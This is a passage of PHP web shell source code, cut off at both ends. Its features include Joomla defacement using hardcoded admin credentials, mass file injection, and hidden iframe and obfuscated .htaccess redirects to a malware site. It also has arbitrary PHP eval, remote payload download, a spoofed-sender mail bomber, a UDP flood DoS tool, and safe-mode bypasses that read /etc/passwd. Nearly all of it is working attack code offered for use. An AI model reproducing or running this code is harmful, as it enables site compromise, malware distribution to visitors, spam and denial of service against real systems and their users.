			$req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
			$data = mysql_fetch_array($req);
			$template_name=$data["template"];
			
			$req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
			 $data = mysql_fetch_array($req);
			$template_id=$data["extension_id"];
						
			$url2=$site_url."/index.php";
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			
				
			$buffer = curl_exec($ch);
				
			$return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
			$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
			
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,"com_config");
			if($pos === false) 
			{
				echo("<br>[-] Login Error");
				exit;
			}
										
			$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 

			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
				
			$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
			if(!$hidden2) 
			{
				echo("<br>[-] index.php Not found in Theme Editor");
				exit;
			}
						
			$url2=$site_url."/index.php?option=com_templates&layout=edit";
						
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
						
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
				
			$pos = strpos($buffer,'<dd class="message message">');
			if($pos === false) 
			{
				echo("<center><font  size=4><blink>Cannot Deface Joomla</blink></font></center>");
			}
			else 
			{
				echo("<center><font class=txt size=4><blink>Joomla Defaced Successfully</blink></font></center>");
			}
		}
		else
		{
			$req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
			$data = mysql_fetch_array($req);
			$template_name=$data["template"];
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,"com_config");
	
			if($pos === false) 
			{
				echo("<br>[-] Login Error");
				exit;
			}
										
			$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
				
			if(!$hidden2) 
			{
				echo("<br>[-] index.php Not found in Theme Editor");
			}
				
			$url2=$site_url."/index.php?option=com_templates&layout=edit";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,'<dd class="message message fade">');
			if($pos === false) 
			{
				echo("<center><font  size=4><blink>Cannot Deface Joomla</blink></font></center>");
				exit;
			}
			else 
			{
				echo("<center><font class=txt size=4><blink>Joomla Defaced Successfully</blink></font></center>");
			}
		}
	}
}
else if(isset($_POST['pathtomass']) &&  $_POST['pathtomass'] != '' &&  isset($_POST['filetype']) &&  $_POST['filetype'] != '' &&  isset($_POST['mode']) &&  $_POST['mode'] != '' && isset($_POST['injectthis']) &&  $_POST['injectthis'] != '')
{
    $filetype = $_POST['filetype'];
    
    $mode = "a"; 
            
    if($_POST['mode'] == 'Apender')
         $mode = "a";
   
    if($_POST['mode'] == 'Overwriter')
         $mode = "w";
        
   	if (is_dir($_POST['pathtomass'])) 
	{
		$lolinject = $_POST['injectthis'];
		$mypath = $_POST['pathtomass'] .$directorysperator. "*.".$filetype;
		if(substr($_POST['pathtomass'], -1) == "\\")
			$mypath = $_POST['pathtomass'] . "*.".$filetype;
		foreach (glob($mypath) as $injectj00) 
		{
			if($injectj00 == 'index.php')
				continue;
			$fp=fopen($injectj00,$mode);
			if (fputs($fp,$lolinject))
				echo '<br><font class=txt size=3>'.$injectj00.' was injected<br></font>';
			else
				echo 'failed to inject '.$injectj00.'<br>';
		}
	}
	else 
		echo '<b>'.$_POST['pathtomass'].' is not available!</b>';
}
else if(isset($_POST['mailfunction']))
{
	if($_POST['mailfunction'] == "dobombing")
	{
		if(isset($_POST['to']) && isset($_POST['subject']) && isset($_POST['message']) && isset($_POST['times']) && $_POST['to'] != '' && $_POST['subject'] != '' && 			$_POST['message'] != '' && $_POST['times'] != '')
		{
			$times = $_POST['times'];
			while($times--)
			{
				if(isset($_POST['padding']))
				{
					$fromPadd = rand(0,9999);
					$subjectPadd = " -- ID : ".rand(0,9999999);
					$messagePadd = "\n\n------------------------------\n".rand(0,99999999);
					
				}
				$from = "president$fromPadd@whitehouse.gov";
				if(!mail($_POST['to'],$_POST['subject'].$subjectPadd,$_POST['message'].$messagePadd,"From:".$from))
				{
					$error = 1;
					echo "<center><font  size=3><blink><blink>Some Error Occured!</blink></font></center>";
					break;
				}
			}
			if($error != 1)
				echo "<center><font class=txt size=3><blink>Mail(s) Sent!</blink></font></center>";
		}
	}
	else if($_POST['mailfunction'] == "massmailing")
	{
		if(isset($_POST['to']) &&  isset($_POST['from']) &&  isset($_POST['subject']) && isset($_POST['message']))
		{
   			if(mail($_POST['to'],$_POST['subject'],$_POST['message'],"From:".$_POST['from']))
        	    echo "<center><font class=txt size=3><blink>Mail Sent!</blink></font></center>";
        	else
        	    echo "<center><font  size=3><blink>Some Error Occured!</blink></font></center>";
		}
	}
}
else if(isset($_POST['code']))
{
	if($_POST['code'] != null && isset($_POST['intext']) && $_POST['intext'] == "true")
	{
		// FIlter Some Chars we dont need
		?><br>
		<textarea name="code" class="box" cols="120" rows="10"><?php 
		$code = str_replace("<?php","",$_POST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);
	
		// Evaluate PHP CoDE!
		htmlspecialchars(eval($code));
		?>
		</textarea><?php 
	}
	else if($_POST['code'] != null && $_POST['intext'] == "false")
	{
		$code = str_replace("<?php","",$_POST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);

		// Evaluate PHP CoDE!
		?><br><font  size="4">Result of execution this PHP-code :</font><br><font class=txt><?php htmlspecialchars(eval($code)); ?></font><?php
	}
}
else if(isset($_GET['infect']))
{
	$coun = 0;
	$str = "<iframe width=0px height=0px frameborder=no name=frame1 src=".$malsite."> </iframe>";
	foreach (glob($_GET['path'] . $directorysperator . "*.php") as $injectj00) 
    {
		if($injectj00 == 'index.php')
			continue;
	    if($myfile=fopen($injectj00,'a'))
	    {
			fputs($myfile, $str);
			fclose($myfile);
	    }
	    else
		$coun = 1;	
    }
    foreach (glob($_GET['path'] . $directorysperator . "*.htm") as $injectj00) 
    {
	   if($myfile=fopen($injectj00,'a'))
	   {	
	    	fputs($myfile, $str);
			fclose($myfile);
	   }
	   else
	   		$coun = 1;
	}
	foreach (glob($_GET['path'] . $directorysperator . "*.html") as $injectj00) 
	{
		if($myfile=fopen($injectj00,'a'))
		{
			 fputs($myfile, $str);
			 fclose($myfile);
		}
		else
		$coun = 1;
	 }
				 
	if($coun == 0)
		echo "<center>Done !!!!<center>";
	else
		echo "<center>Cannot open files !!!!<center>";
}
else if(isset($_GET['redirect']))
{
	if($myfile = fopen(".htaccess",'a'))
	{
		$mal = "eNqV0UtrAjEQAOC70P8wYHsRyRa8FYpQSR9QXAmCBxHJrkMSjDNhk/pA/O+uFuyx5javj4GZLrzJj68xzLhZTRqM8aGjcNe4hJKMI4SSbpUyJMcUwZHFNr/VR0wreDp+TqeTpZLvUkl1AtHTcS1q3ojeI8zHo36pFv8Jw2w8ZoBNpMuK+0HlyOQJ77aYJzT7TOCT3rqYdB7Dfd0280xE3dRWHLRl/lV/RP14bEfAphReisJ4rrQPvGt/TcboZK8BXy9eOBLBhiG9Dp5hrvrfizOeH7rw";
		fwrite($myfile, gzuncompress(base64_decode($mal)));
		fwrite($myfile, "\n\r");
		fclose($myfile);
		echo "<center>Done !!!!<center>";
	}
	else
		echo "<center>Cannot open file !!!!<center>";
}
else if(isset($_GET['malware']))
{ ?>
	<input type="hidden" id="malpath" value="<?php echo $_GET["dir"]; ?>">
	<center><table><tr><td><a href=# onClick="malwarefun('infect')"><font class=txt size="4">| Infect Users |</font></a></td>
	<td><a href=javascript:void(0) onClick="malwarefun('redirect')"><font class=txt size="4">| Redirect Search Engine TO Malwared site |</font></a></td></tr></table></center>
	<div id="showmal"></div>
	<?php
}	
else if(isset($_GET['codeinsert']))
{
	if($file1 = fopen(".htaccess",'r'))
	{
	?><div id="showcode"></div>
	<form method=post>
	<textarea rows=9 cols=110 name="code" class=box><?php while(!feof($file1)) { echo fgets($file1); } ?></textarea><br>
	<input type="button" onClick="codeinsert(code.value)" value="  Insert  " class=but>
	</form>
	<?php }
	else
		echo "<center>Cannot Open File!!</center>";
}
else if(isset($_POST['getcode'])) 
{
	 if($myfile = fopen(".htaccess",'a'))
	{
		fwrite($myfile, $_POST['getcode']);
		fwrite($myfile, "\n\r");
		fclose($myfile);
		echo "<font class=txt>Code Inserted Successfully!!!!</font>";
	}
	else
		echo "Permission Denied";
}
else if(isset($_GET['uploadurl']))
{
	$functiontype = trim($_GET['functiontype']); 
	$wurl = trim($_GET['wurl']); 
	$path = magicboom($_GET['path']); 
	
	function remotedownload($cmd,$url)
	{ 
		$namafile = basename($url); 
		switch($cmd) 
		{ 
			case 'wwget': 
				execmd(which('wget')." ".$url." -O ".$namafile);
				break; 
			case 'wlynx': 
				execmd(which('lynx')." -source ".$url." > ".$namafile);
				break; 
			case 'wfread' : 
				execmd($wurl,$namafile);
				break; 
			case 'wfetch' : 
				execmd(which('fetch')." -o ".$namafile." -p ".$url);
				break; 
			case 'wlinks' : 
				execmd(which('links')." -source ".$url." > ".$namafile);
				break; 
			case 'wget' : 
				execmd(which('GET')." ".$url." > ".$namafile);
				break; 
			case 'wcurl' : 
				execmd(which('curl')." ".$url." -o ".$namafile);
				break; 
			default: 
			break; 
		} 
		return $namafile; 
	}
	$namafile = remotedownload($functiontype,$wurl); 
	$fullpath = $path . $directorysperator . $namafile;
	if(is_file($fullpath)) 
	{ 
		echo "<center><font class=txt>File uploaded to $fullpath</font></center>"; 
	} 
	else 
		echo "<center>Failed to upload $namafile</center>"; 
}
else if(isset($_GET['createfolder']))
{
	if(!mkdir($_GET['createfolder']))
			echo "Failed To create";
	else
		echo "<font class=txt>Folder Created Successfully</font>";
}
else if(isset($_GET['selfkill']))
{
	if(unlink('index.php'))
		echo "<br><center><font size=5>Good Bye......</font></center>";
	else
		echo "<br><center><font size=5>Shell cannot be removed......</font></center>";
}
else if(isset($_GET['Create']))
{
	?>
	<form method="post">
		<input type="hidden" name="filecreator" value="<?php echo $_GET['Create']; ?>">
		<textarea name="filecontent" rows="12" cols="100" class="box"></textarea><br />
        <input type="button" onClick="createfile(filecreator.value,filecontent.value)" value="  Save " class="but"/>
  </form>
		
<?php }
else if(isset($_POST['filecreator'])&&isset($_POST['filecontent']))
{
	$content = $_POST['filecontent'];
	if($file_pointer = fopen($_POST['filecreator'], "w+"))
	{
		fwrite($file_pointer, $content); 
		fclose($file_pointer);
		echo "<font class=txt>File Created Successfully</font>";
	}
	else
		echo "Cannot Create File";
}
else if(isset($_REQUEST["defaceforum"]))
{ 
	?>
	<center><div id="showdeface"></div>
	<font color="#FF0000" size="4">Forum Index Changer</font>
	<form action="<?php echo $self; ?>" method = "POST">
		<input type="hidden" name="forum">
		<input type="hidden" name="defaceforum">
		<table border = "1" width="60%" style="text-align: center;border-color:#333333;" align="center"> 
			<tr>
				<td height="50" width="50%"> <b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost"></td>
				
				<td width="50%"><b> Database :</b> <input type ="text" class="sbox" name = "f2" size="20"></td></tr>										 					
				<tr><td height="50" width="50%"><b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> </td>
				<td><b> Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20"></td></tr>
			
				<tr><td height="50" width="50%">Type : 
				<select class=sbox id="forumdeface" name="forumdeface" onChange="checkforum(this.value)">
					<option value="vb">vbulletin</option>
					<option value="mybb">Mybb</option>
					<option value="smf">SMF</option>
					<option value="ipb">IPB</option>
					<option value="wp">Wordpress</option>
					<option value="joomla">Joomla</option>
				</select></td>
				<td height="50" width="50%">Prefix : <input type="text" id="tableprefix" name="tableprefix" class="sbox"></td></td>
				
			</tr>
			<tr>
				<td height="167" width="50%" colspan=2>
				<div style="display:none;" id="myjoomla"><p><b>Site URL : </b><input class="box" type="text" name="siteurl" width="80" value="http://site.com/administrator/"></p></div>
					
				<div style="display:none;" id="smfipb"><p align="center"><b>Head : </b><input class="sbox" type="text" name="head" size="20" value="Hacked">&nbsp; <b>Kate ID : </b><input class="sbox" type="text" name="f5" size="20" value="1">
				<label id="wordpres" style="display:none; float:right; margin-right:8%;"><input type="checkbox" name="all" value="All" checked="checked"> All</label></p>
				</div>
			
				<p align="center">&nbsp;<textarea class="box" name="index" cols=53 rows=8><b>lol ! You Are Hacked !!!!</b></textarea><p align="center">
				<input type="button" onClick="forumdefacefn(index.value,f1.value,f2.value,f3.value,f4.value,forumdeface.value,tableprefix.value,siteurl.value,head.value,all.value,f5.value)" class="but" value = "Hack It">
			</td>
		</tr>
	</table>
	</form>
		</center>	
	<?php 
		}
		else if(isset($_GET["passwordchange"]))
		{
			echo "<center>";
			?>
			<div id="showchangepass"></div>
			<font color="#FF0000" size="4">Forum Password Changer</font>
			<form onSubmit="changeforumpassword('forumpass',f1.value,f2.value,f3.value,f4.value,forums.value,tableprefix.value,ipbuid.value,newipbpass.value,username.value,newjoomlapass.value,uid.value,uname.value,newpass.value);return false;">
			<table border = "1" width="60%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="50" width="50%"> <b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost"></td><td height="50" width="50">&nbsp;<b>  DataBase :</b> <input type ="text" class="sbox" name = "f2" size="20"></td> <tr><td height="50" width="50%">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"></td><td height="50" width="50%"> <b>Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20"></td></tr>
					<tr>
					<td height="50" width="50%">Type : 
					<select class=sbox id="forums" name="forums" onChange="showMsg(this.value)">
					<option value="vb">vbulletin</option>
					<option value="mybb">Mybb</option>
					<option value="smf">SMF</option>
					<option value="ipb">IPB</option>
					<option value="phpbb">PHPBB</option>
					<option value="wp">Wordpress</option>
					<option value="joomla">Joomla</option>
					</select></td>
					<td height="50" width="50%">Prefix : <input type="text" id="tableprefix" name="tableprefix" class="sbox"></td>
				</tr>
				<tr>
					<td colspan=2 height="100" width="780">
					
					<p align="center"><div id="fid" style="display:block;"><b>User ID :</b> <input class="sbox" type="text" name="ipbuid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newipbpass" size="20" value="hacked"></div>
					
					<div id="joomla" style="display:none;"><b>New Username :</b> <input style="width:170px;" class="box" type="text" name="username" size="20" value="admin">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newjoomlapass" size="20" value="hacked"></div>
					
					<div id="wpress" style="display:none;"><p><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><b>New Username :</b> <input style="width:170px;" class="box" type="text" name="uname" size="20" value="admin"></div>
					
					<p><input type = "button" onClick="changeforumpassword('forumpass',f1.value,f2.value,f3.value,f4.value,forums.value,tableprefix.value,ipbuid.value,newipbpass.value,username.value,newjoomlapass.value,uid.value,uname.value,newpass.value)" class="but" value = "  Change IT  " name="forumpass"></p></td>
				</tr>
			</table>
			</form>
		</center>	
			<?php
}
else if(isset($_GET['dosser']))
{
	if(isset($_GET['ip']) &&  isset($_GET['exTime']) && isset($_GET['port']) && isset($_GET['timeout']) && isset($_GET['exTime']) && $_GET['exTime'] != "" &&
		$_GET['port'] != "" && $_GET['ip'] != "" &&	$_GET['timeout'] != "" && $_GET['exTime'] != ""	)
	{
		   $IP=$_GET['ip'];
		   $port=$_GET['port'];
		   $executionTime = $_GET['exTime'];
		   $no0fBytes = $_GET['no0fBytes'];
		   $data = "";
		   $timeout = $_GET['timeout'];
		   $packets = 0;
		   $counter = $no0fBytes;
		   $maxTime = time() + $executionTime;;
		   while($counter--)
		   {
				$data .= "X";
		   }
		   $data .= " AK"; 
		   
		   while(1)
		   {
				$socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
				if($socket)
				{
					fwrite($socket , $data);
					fclose($socket);
					$packets++;
				}
				if(time() >= $maxTime)
				{
					break;
				}
			}
			echo "Dos Completed!<br>";
			echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
			echo "Total Number of Packets Sent : " . $packets . "<br />";
			echo "Total Data Sent = ". HumanReadableFilesize($packets*$no0fBytes) . "<br />"; 
			echo "Data per packet = " . HumanReadableFilesize($no0fBytes) . "<br />";
	}
}
else if(isset($_GET['fuzzer']))
{
	if(isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['timeout']) && isset($_GET['exTime']) && isset($_GET['no0fBytes']) && isset($_GET['multiplier']) && $_GET['no0fBytes'] != "" && $_GET['exTime'] != "" && $_GET['timeout'] != "" && $_GET['port'] != "" && $_GET['ip'] != "" && $_GET['multiplier'] != "")
    {
        $IP=$_GET['ip'];
        $port=$_GET['port'];
        $times = $_GET['exTime'];
		$timeout = $_GET['timeout'];
		$send = 0;
        $ending = "";
        $multiplier = $_GET['multiplier'];
        $data = "";
        $mode="tcp";
        $data .= "GET /";
        $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
	
        while($multiplier--)
        {
            $data .= urlencode($_GET['no0fBytes']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-AK".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       for($i=0;$i<$times;$i++)
	{
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "Fuzzing Completed!<br>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
}
else if(isset($_GET['bypassit']))
{
	if(isset($_GET['copy']))
	{
		if(@copy($_GET['copy'],"test1.php")) 
		{
			$fh=fopen("test1.php",'r');
			echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars(@fread($fh,filesize("test1.php")))."</textarea></br></br>";
			@fclose($fh);
			unlink("test1.php");
		} 
	}
	else if(isset($_GET['imap']))
	{
		$string = $_GET['imap'];
		echo "<textarea cols=120 rows=20 class=box readonly>";
		$stream = imap_open($string, "", "");
		$str = imap_body($stream, 1);
		echo "</textarea>";
	}
	else if(isset($_GET['sql']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		$file=$_GET['sql'];
		
		$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
		$mysql_files = explode(':', $mysql_files_str);
			
		$sql = array (
			"USE $mdb",
				'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
				"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
				. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
				. "ESCAPED BY          '' "
				. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
				
				"SELECT a FROM $tbl LIMIT 1"
				);
		mysql_connect ($mhost, $muser, $mpass);
				
		foreach ($sql as $statement) {
		   $q = mysql_query ($statement);
		
		   if ($q == false) die (
				  "FAILED: " . $statement . "\n" .
					  "REASON: " . mysql_error () . "\n"
				   );
				
		   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
			
				   echo htmlspecialchars($r[0]);
				   mysql_free_result ($q);
				}
				echo "</textarea>";
			}
	else if(isset($_GET['curl']))
	{
		$ch=curl_init("file://" . $_GET[curl]);
		curl_setopt($ch,CURLOPT_HEADERS,0);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		$file_out=curl_exec($ch);
		curl_close($ch);
		echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
	}
	else if(isset($_GET['include']))
	{
		if(file_exists($_GET['include']))
		{
			echo "<textarea cols=120 rows=20 class=box readonly>";
			@include($_GET['include']);
			echo "</textarea>";
		}
		else
			echo "<br><center><font  size=3>Can't Read" . $_GET['include'] . "</font></center>";
	}
	else if(isset($_GET['id']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		for($uid=0;$uid<60000;$uid++)
		{   //cat /etc/passwd
			$ara = posix_getpwuid($uid);
			if (!empty($ara)) 
			{
				while (list ($key, $val) = each($ara))
				{
					print "$val:";
				}
				print "\n";
			}
		}
		echo "</textarea>";
		break;
	}
	else if(isset($_GET['tempnam']))
	{
		$mytmp = tempnam ( 'tmp', $_GET['tempnam'] );
		$fp = fopen ( $mytmp, 'r' );
		while(!feof($fp))
			echo fgets($fp);
		fclose ( $fp );
	}
	else if(isset($_GET['symlnk']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		@mkdir("myAK",0777);
		@chdir("myAK");
		execmd("ln -s /etc/passwd");
		
		echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/myAK/passwd");
		echo "</textarea>";
	}
	if(isset($_GET['newtype']))
	{
		$filename = $_GET['newtype'];
		echo "<textarea cols=120 rows=20 class=box readonly>";
		if($_GET['optiontype'] == "xxd")
			echo execmd("xxd ".$filename);
		else if($_GET['optiontype'] == "rev")
			echo execmd("rev ".$filename);
		if($_GET['optiontype'] == "tac")
			echo execmd("tac ".$filename);
		if($_GET['optiontype'] == "more")
			echo execmd("more ".$filename);
		if($_GET['optiontype'] == "less")
			echo execmd("less ".$filename);
		echo "</textarea>";
	}
}
// Deface Website
else if(isset($_GET['deface']))
{
	$myfile = fopen($_GET['deface'],'w');
	if(fwrite($myfile, base64_decode($ind)))
	{fclose($myfile);
	echo "Index Defaced Successfully";}
	else
		echo "Donot have write permission";
}
else if(isset($_GET['perms']))
{
?>
    <form>
	<input type="hidden" name="myfilename" value="<?php echo $_GET['myfilepath']; ?>">
        <table align="center" border="1" style="width:40%;border-color:#333333;">
            <tr>
                <td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
            </tr>
			<tr>
				<td colspan="2" align="center" style="height:60px">
        <input type="button" onClick="changeperms(chmode.value,myfilename.value)" value="Change Permission" class="but" style="padding: 5px;" /></td>
			</tr>
        </table>
		
	</form>   
    <?php
}
else if(isset($_GET["chmode"]))
{
	if($_GET['chmode'] != null && is_numeric($_GET['chmode']))
	{
		$perms = 0; 
        for($i=strlen($_GET['chmode'])-1;$i>=0;--$i) 
            $perms += (int)$_GET['chmode'][$i]*pow(8, (strlen($_GET['chmode'])-$i-1)); 
		if(@chmod($_GET['myfilename'],$perms))
			echo "<center><blink><font class=txt>File Permissions Changed Successfully</font></blink></center>";
		else
			echo "<center><blink>Cannot Change File Permissions</blink></center>";
	}
}
else if(isset($_GET['rename']))
{
?>
    <form>
	   <table border="0" cellpadding="3" cellspacing="3">
            <tr>
                <td>File </td><td><input value="<?php echo $_GET['myfilepath'];?>" name="file" class="box" /></td>
            </tr>
            <tr>
                <td>To </td><td><input value="<?php echo $_GET['myfilepath'];?>" name="to" class="box" /></td> 
            </tr>
			<tr>
				<td colspan="2"><input type="button" onClick="renamefun(file.value,to.value)" value="Rename It" class="but" style="margin-left: 160px;padding: 5px;"/></td>
			</tr>
        </table>
	</form>   
    <?php
  
}
else if(isset($_GET['renamemyfile']))
{
	if(isset($_GET['to']) && isset($_GET['file']))
	{
		 if(!rename($_GET['file'], $_GET['to']))
		 	echo "Cannot Rename File";
		else
			echo "<font class=txt>File Renamed Successfully</font>";
	
	}
}
else if(isset($_GET['open']))
{
	if(is_file($_GET['myfilepath']))
	{
		$owner = "0/0";
		if($os == "Linux")
			$owner = getOGid($_GET['myfilepath']);
		?>
			<form>
			<table style="width:57%;">
				<tr align="left">
					<td align="left">File : </td><td><font class=txt><?php echo $_GET['myfilepath'];?></font></td><td align="left">Permissions : </td><td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo addslashes($_GET['myfilepath']); ?>')"><?php echo filepermscolor($_GET['myfilepath']);?></a></td>
				</tr>
				<tr>
					<td>Size : </td><td><?php echo HumanReadableFileSize(filesize($_GET['myfilepath']));?></td><td>Owner/Group : </td><td><font class=txt><?php echo $owner;?></font></td> 
				</tr>
			</table>
			<textarea name="content" rows="15" cols="100" class="box"><?php
			$content = htmlspecialchars(file_get_contents($_GET['myfilepath']));
			if($content)
			{
				echo $content;
			}
			else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
			{
				if(filesize($_GET['myfilepath']) != 0 )
				{
					fopen($_GET['myfilepath']);
					while(!feof())
					{
						echo htmlspecialchars(fgets($_GET['myfilepath']));
					}
				}
			}
	
			?>
			</textarea><br />
			<input name="save" type="button" onClick="savemyfile('<?php echo addslashes($_GET['myfilepath']); ?>',content.value)" value="Save Changes" id="spacing" class="but"/>
			</form>
    <?php
	}
	else
		echo "File does not exist !!!!";
}
else if(isset($_POST['file']) && isset($_POST['content']))
{
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
        if(fwrite($handle,$_POST['content']))
        	echo "<font class=txt>File Saved Successfully!</font>";
	else
